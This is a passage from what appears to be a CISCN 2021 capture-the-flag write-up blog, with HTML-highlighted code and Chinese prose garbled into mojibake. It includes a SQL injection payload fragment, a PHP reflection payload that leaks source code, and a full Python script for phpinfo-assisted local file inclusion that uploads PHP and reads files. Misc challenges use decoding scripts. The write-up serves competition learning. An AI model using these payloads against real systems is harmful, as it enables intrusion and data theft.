operator">+</span>b<span class="token operator">+</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token keyword">no</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x717a6a7871</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95</span></code></pre><p>åŒè¡¨æŸ¥è¯¢å¾—åˆ°åˆ—åid,no,200e6beb-a706-473f-add2-29e877c6ce25</p><p>æœ€ç»ˆ</p><img src="/article/ciscn2021/1.jpg" class="" title="2ED72E0CF8ED07FBCB27F11F73A6187B" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;63zs0-zMP27-bhZDu-kIEv3-AvlHh-&#125;</code></pre><hr><h3 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h3><p>åŸé¢˜ï¼š<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>æ‰«ç›®å½•å‘ç°<code>.index.php.swo</code></p><p>å¯ä»¥åˆ©ç”¨ PHP å†…ç½®ç±»ä¸­çš„ <code>ReflectionMethod</code> æ¥è¯»å– <code>User</code> ç±»é‡Œé¢å„ä¸ªå‡½æ•°çš„æ³¨é‡Š</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">.&#x2F;?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</code></pre><img src="/article/ciscn2021/image-20210515124614970.png" class="" title="image-20210515124614970" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;Ak4Z6-6GU0a-fAz0n-OTdYy-KDq4Q-&#125;</code></pre><hr><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><p>æ‰«ç›®å½•å‘ç°<code>.listing</code></p><p>è®¿é—®å¾—åˆ°<code>you_can_seeeeeeee_me.php</code>ï¼Œç»™äº†phpinfo</p><p>æ ¹æ®æºç å‘ç°</p><p><code>$_POST[&quot;field&quot;];</code>å’Œ<code>echo $$field;</code>æœ‰å‡ºå…¥</p><p>æ ¹æ®vulhubä¸€ä¸ªåˆ©ç”¨phpinfoè¿›è¡Œæ–‡ä»¶åŒ…å«çš„æ¼æ´ï¼Œæ”¹ä¸€ä¸‹expç›´æ¥æ‰“</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a></p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> threading<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    TAG<span class="token operator">=</span><span class="token string">"Security Test"</span>    <span class="token comment"># PAYLOAD = """%s\r</span>    <span class="token comment"># &lt;?php var_dump(scandir('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/'));?>\r""" % TAG</span>    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">"""%s\r&lt;?php var_dump(file_get_contents('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g'));?>\r"""</span> <span class="token operator">%</span> TAG    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name="123"; filename="test.txt"\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714"""</span> <span class="token operator">%</span> PAYLOAD    padding<span class="token operator">=</span><span class="token string">"G"</span> <span class="token operator">*</span> <span class="token number">5000</span>    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST /?a="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">""" HTTP/1.1\rCookie: PHPSESSID=1; othercookie="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\rHTTP_USER_AGENT: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT_LANGUAGE: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_PRAGMA: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s"""</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>    <span class="token comment">#modify this to suit the LFI script  </span>    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST / HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\rContent-Type: application/x-www-form-urlencodedContent-Length: %s\r\r%s"""</span>    <span class="token comment">#print(REQ1)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>    d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    fn<span class="token operator">=</span><span class="token string">"cf=../../../../../..&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span>    <span class="token comment">#print(fn)</span>    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>        <span class="token keyword">return</span> fncounter<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> counter        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">return</span>                counter<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>                                <span class="token keyword">if</span> x<span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"\nGot it!"</span>                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>                <span class="token keyword">return</span>    <span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>        d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>        d<span class="token operator">+=</span>i                <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token comment"># detect the final chunk</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>    <span class="token comment"># padded up a bit</span>    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span>    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    port<span class="token operator">=</span><span class="token number">80</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        poolsz<span class="token operator">=</span><span class="token number">10</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span>      reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">with</span> l<span class="token punctuation">:</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">print</span>        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"Woot!  \m/"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">":("</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"\nTelling threads to shutdown..."</span>        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è·‘å‡ºç»“æœ</p><img src="/article/ciscn2021/image-20210515181707458.png" class="" title="image-20210515181707458" loading="lazy"><img src="/article/ciscn2021/image-20210515182132566.png" class="" title="image-20210515182132566" loading="lazy"><img src="/article/ciscn2021/image-20210515182141809.png" class="" title="image-20210515182141809" loading="lazy"><img src="/article/ciscn2021/image-20210515182239294.png" class="" title="image-20210515182239294" loading="lazy"><img src="/article/ciscn2021/image-20210515182330338.png" class="" title="image-20210515182330338" loading="lazy"><img src="/article/ciscn2021/image-20210515182410646.png" class="" title="image-20210515182410646" loading="lazy"><img src="/article/ciscn2021/image-20210515183203380.png" class="" title="image-20210515183203380" loading="lazy"><p>flagä½ç½®ï¼š<code>/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g</code></p><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;BmLDI-8WFso-KZGN9-XObp3-sjSOf-&#125;</code></pre><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>æµé‡åŒ…åˆ†æ</p><img src="/article/ciscn2021/9CFC275D-3F65-48C5-A8BE-F9B67DDD610D.png" class="" title="9CFC275D-3F65-48C5-A8BE-F9B67DDD610D" loading="lazy"><p>å‘ç°ä¸‰ä¸ªå…³é”®éƒ¨åˆ†</p><p>å…¨éƒ¨å¯¼å‡ºçœ‹çœ‹ï¼Œè§£å‹<code>flag_wrapper</code>å¾—åˆ°<code>CISCN&#123;&#125;</code></p><img src="/article/ciscn2021/image-20210516043809208.png" class="" title="image-20210516043809208" loading="lazy"><p>åˆ©ç”¨è„šæœ¬è§£brå‘ç°proto3å†…å®¹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> brotli<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./test.br"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>content <span class="token operator">=</span> brotli<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"bw"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span></code></pre><img src="/article/ciscn2021/image-20210516052103002.png" class="" title="image-20210516052103002" loading="lazy"><p>å¯¼å‡º<code>secret</code>å†…å®¹å¦‚ä¸‹</p><img src="/article/ciscn2021/image-20210516052229144.png" class="" title="image-20210516052229144" loading="lazy"><p>ç”±æ­¤åº”è¯¥æ˜¯ç”¨proto3åè®®æ¥è§£å¯†</p><p>æ ¹æ®æ•™ç¨‹<a href="https://www.cnblogs.com/luoxn28/p/5303517.html">https://www.cnblogs.com/luoxn28/p/5303517.html</a></p><p>å®‰è£…ç¯å¢ƒåç”¨å…¶è‡ªå¸¦çš„decodeæ–¹æ³•ï¼Œç”¨testæ–‡ä»¶è§„å®šçš„è§£å¯†è§„åˆ™å°†å¤„ç†è¿‡çš„<code>secret</code>è¿›è¡Œè§£å¯†</p><img src="/article/ciscn2021/image-20210516054849721.png" class="" title="image-20210516054849721" loading="lazy"><p>æœ‰ç”¨çš„éƒ¨åˆ†åœ¨<code>PBResponse</code></p><p>æœ€åæ‹¼æ¥flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">15100450</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"e2345"</span><span class="token operator">+</span><span class="token string">"7889b0"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">16453958</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"d172a38dc"</span></code></pre><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;</code></pre><hr><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h3><p>ä¸‹è½½ä¸ºgifï¼ŒPhotoshopæ‰“å¼€å‘ç°æœ‰å‡ ç™¾å¸§ï¼Œä»”ç»†è§‚å¯Ÿå‘ç°æ¯å¸§ä¸Šæœ‰å¥‡æ€ªåƒç´ ç‚¹ï¼ŒRGBå€¼ä¸º(233,233,233)</p><img src="/article/ciscn2021/image-20210516045206693.png" class="" title="image-20210516045206693" loading="lazy"><p>åˆ©ç”¨convertè¿›è¡ŒæŠ½å¸§</p><pre class="language-sh" data-language="sh"><code class="language-sh">convert .&#x2F;running_pixel.gif .&#x2F;output&#x2F;out%05d.png</code></pre><p>æŠŠæ¯å¼ å›¾RGB(233,233,233)åƒç´ çš„åæ ‡æå–å‡ºæ¥æ”¾æ–‡æ¡£é‡Œ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./output/"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagewidth <span class="token operator">=</span> <span class="token number">400</span>height <span class="token operator">=</span> <span class="token number">400</span><span class="token keyword">def</span> <span class="token function">get_rgb</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    pixel <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>    coordinates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    out_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./list.txt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token punctuation">,</span> g <span class="token punctuation">,</span>b <span class="token operator">=</span> pixel<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span>            <span class="token keyword">if</span> r <span class="token operator">==</span> g <span class="token operator">==</span> b <span class="token operator">==</span> <span class="token number">233</span><span class="token punctuation">:</span>                coordinate <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>                out_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>coordinate <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>                <span class="token comment"># print(r, g, b)</span>    <span class="token keyword">return</span> coordinates  <span class="token keyword">def</span> <span class="token function">get_files</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> img  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        pic <span class="token operator">=</span> get_files<span class="token 